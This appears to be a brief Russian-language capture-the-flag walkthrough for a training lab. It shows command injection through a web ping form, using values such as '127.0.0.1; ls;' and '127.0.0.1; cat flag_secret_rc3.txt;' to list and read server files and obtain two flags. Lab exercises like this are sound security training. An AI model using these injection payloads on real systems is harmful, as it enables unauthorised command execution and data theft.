# PoC

- откройте в браузере `http://www.hacktory.lab`
- на вкладке PING напишите `127.0.0.1; ls; `
- получаем первый флаг - `ping -c 1 127.0.0.1` 
- далее сможем прочитать файл с флагом на сервере
- читаем файл на сервере командой - `127.0.0.1; cat flag_secret_rc3.txt; `
- получаем второй флаг - `rC3_flag`